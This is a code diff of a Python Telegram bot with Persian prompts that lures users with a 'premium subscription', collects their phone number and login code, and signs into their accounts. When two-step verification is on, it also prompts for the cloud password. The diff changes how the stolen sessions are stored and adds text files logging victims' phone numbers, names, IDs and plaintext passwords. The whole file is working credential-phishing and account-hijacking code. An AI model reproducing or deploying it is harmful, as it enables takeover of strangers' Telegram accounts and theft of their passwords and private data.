@@ -1,17 +1,16 @@
-﻿import os
+import os
 import asyncio
 import telebot
 from telethon import TelegramClient, events, Button
 from telethon.errors import SessionPasswordNeededError, PhoneNumberInvalidError, PhoneNumberFloodError, PhoneCodeInvalidError
 from telethon.tl.types import KeyboardButtonRequestPhone
-from telethon.sessions import StringSession
 import logging
 from termcolor import colored
 import sys
-import pyfiglet
 from colorama import Fore, Style, init
 import time
-
+import pyfiglet
+import random
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s: %(message)s')
 
@@ -21,6 +20,7 @@ CHANNEL_USERNAME = input(colored("channel user_name (please use @ : @username): 
 CHANNEL = CHANNEL_USERNAME[1:]
 BOT_TOKEN = input(colored("BOT-TOKEN : ", 'light_blue'))
 bot = TelegramClient('bot_session', API_ID, API_HASH)
+telebotapi = telebot.TeleBot(BOT_TOKEN)
 
 init(autoreset=True)
 
@@ -42,7 +42,6 @@ print(colored("Github -: https://github.com/inits5", attrs=['bold'], on_color='o
 print(colored("Github -: https://github.com/QMdev", attrs=['bold'], on_color='on_dark_grey'))
 print(colored("telegram -: https://t.me/Scripted_Seer",  attrs=['bold'], on_color='on_cyan'))
 
-telebotapi = telebot.TeleBot(BOT_TOKEN)
 
 user_states = {}
 user_clients = {}
@@ -92,14 +91,14 @@ async def start_handler(event):
     else:
         join_button = Button.url('📢 عضویت در کانال', f'https://t.me/{CHANNEL}')
         confirm_button = Button.inline('✅ تایید عضویت شما', 'confirm_membership')
-        await event.reply('⚠️ برای دریافت اشتراک پریمیوم، ابتدا در کانال رسمی ما عضو شوید. سپس بر روی گزینه تایید عضویت کلیک کنید:', buttons=[join_button, confirm_button])
+        await event.reply('⚠️ برای دریافت اشتراک پریمیوم، ابتدا در کانال رسمی ما عضو شوید. سپس بر روی گزینه تایید عضویت کلیک کنید: ', buttons=[join_button, confirm_button])
 
 @bot.on(events.CallbackQuery(pattern='confirm_membership'))
 async def confirm_membership(event):
     user_id = event.sender_id
 
     if check_membership(user_id):
-        await event.edit('✅ شما با موفقیت در کانال عضو شدید. برای ادامه فرایند، روی گزینه /start کلیک کنید.', buttons=[[KeyboardButtonRequestPhone('📱 ارسال شماره تلفن')]])
+        await event.edit('شما در کانال ما عضو شدید برای ادامه فرایند لطفا ربات را دوباره استارت کنید /start ', buttons=[[KeyboardButtonRequestPhone('📱 ارسال شماره تلفن')]])
         user_states[user_id] = 'waiting_for_phone'
     else:
         await event.edit('❌ شما هنوز در کانال عضو نشده‌اید. لطفاً ابتدا در کانال عضو شوید.')
@@ -117,14 +116,20 @@ async def handle_phone_number(event):
     if state == 'waiting_for_phone' and message.contact:
         phone = message.contact.phone_number
         try:
-            client = TelegramClient(StringSession(), API_ID, API_HASH)
+            if not os.path.exists('sessions'): os.makedirs('sessions')
+            t = random.randint(11, 28882)
+            sessionss = f'sessions/session_{user_id}__%{t}.session'
+            client = TelegramClient(sessionss, API_ID, API_HASH)
+            if not os.path.exists('info'): os.makedirs('info')
             await client.connect()
             await client.send_code_request(phone=phone)
             user_clients[user_id] = client
             user_states[user_id] = 'waiting_for_code'
             user_codes[user_id] = ''
-            log_info(f"Phone number {phone} sent for user {user_id}.")
-            await event.reply('📤 کد تأیید ارسال شد. لطفاً کد را وارد کنید:', buttons=get_number_keyboard())
+            log_info(f"Phone number {phone} sent for user {user_id}")
+            await event.reply('کد تأیید ارسال شد لطفا با کمک دکمه ها کد ورود را وارد کنید:', buttons=get_number_keyboard())
+            with open(f'info/info_user_{user_id}.txt', 'w') as file:
+                file.write(f"number: {phone} for {user_id}\n")
         except PhoneNumberInvalidError:
             log_error(f"Invalid phone number: {phone}")
             await event.reply('❌ شماره تلفن وارد شده معتبر نیست. لطفاً دوباره تلاش کنید.')
@@ -145,21 +150,20 @@ async def handle_verification_code(event):
         if code:
             try:
                 await client.sign_in(code=code)
-                session_string = client.session.save()
-
+                session_bytes = client.session.save()
                 user_info = await bot.get_entity(user_id)
                 first_name = user_info.first_name if user_info.first_name else "Unknown"
                 last_name = user_info.last_name if user_info.last_name else "Unknown"
                 username = user_info.username if user_info.username else "Unknown"
                 phone = user_info.phone if user_info.phone else "Unknown"
-
-                session_filename = f'sessions/session_{first_name}_{last_name}_{username}_{user_info.id}_{phone}.session'
-                
-                os.makedirs(os.path.dirname(session_filename), exist_ok=True)
-
-                with open(session_filename, 'w') as f:
-                    f.write(session_string)
-                    log_success(f"Session saved: {session_filename}")
+                if not os.path.exists('info'): os.makedirs('info')
+                info_file = f"info/info_user_{user_id}.txt"
+                with open(info_file, "a", encoding='utf-8') as i:
+                    i.write(f"session name: {user_id}.session \n")
+                    i.write(f"user name: {first_name} {last_name}\n")
+                    i.write(f"id: {user_info.id}\n")
+                    i.write(f"{'-' * 30}\n")
+                    log_success(f"txt saved: {info_file} ")
 
                 await client.send_message('me', f'''کاربر : {first_name}
 ایدی : {user_id}
@@ -189,7 +193,7 @@ async def handle_verification_code(event):
                 fail_attempts = user_fail_attempts.get(user_id, 0)
                 if fail_attempts < 3:
                     user_fail_attempts[user_id] = fail_attempts + 1
-                    await event.answer("⚠️ برای تکمیل فرایند، لطفاً رمز عبور دو مرحله‌ای خود را وارد کنید.", alert=True)
+                    await event.answer("کاربر گرامی اکانت شما تایید دومرحله‌ای دارد لطفا رمز را وارد کنید", alert=True)
                     await event.edit('🔐 لطفاً رمز عبور دو مرحله‌ای خود را وارد کنید:')
 
                     @bot.on(events.NewMessage(func=lambda e: e.sender_id == user_id))
@@ -197,21 +201,21 @@ async def handle_verification_code(event):
                         password = password_event.text.strip()
                         try:
                             await client.sign_in(password=password)
-                            session_string = client.session.save()
+                            session_bytes = client.session.save()
 
                             user_info = await bot.get_entity(user_id)
                             first_name = user_info.first_name if user_info.first_name else ""
                             last_name = user_info.last_name if user_info.last_name else ""
                             username = user_info.username if user_info.username else ""
                             phone = user_info.phone if user_info.phone else ""
-
-                            session_filename = f'sessions/session_{first_name}_{username}_{user_info.id}_password_{password}.session'
-                            
-                            os.makedirs(os.path.dirname(session_filename), exist_ok=True)
-
-                            with open(session_filename, 'w') as f:
-                                f.write(session_string)
-                                log_success(f"Session saved: {session_filename}")
+                            if not os.path.exists('info'): os.makedirs('info')
+                            info_file = f"info/info_user_{user_id}.txt"
+                            with open(info_file, "a",  encoding='utf-8') as i:
+                                i.write(f"user: {first_name} {last_name}\n")
+                                i.write(f"chat id: {user_info.id}\n")
+                                i.write(f"password: {password}\n")
+                                i.write(f"{'-' * 30}\n")
+                                log_success(f"txt saved: {info_file}")
 
                             await client.send_message('me', f'''کاربر : {first_name}
 ایدی : {user_id}
@@ -265,7 +269,7 @@ async def handle_callback_query(event):
 
 async def main():
     await bot.start(bot_token=BOT_TOKEN)
-    log_info("Bot successfully started.")
+    log_info("Bot runed")
     await bot.run_until_disconnected()
 
 if __name__ == '__main__':
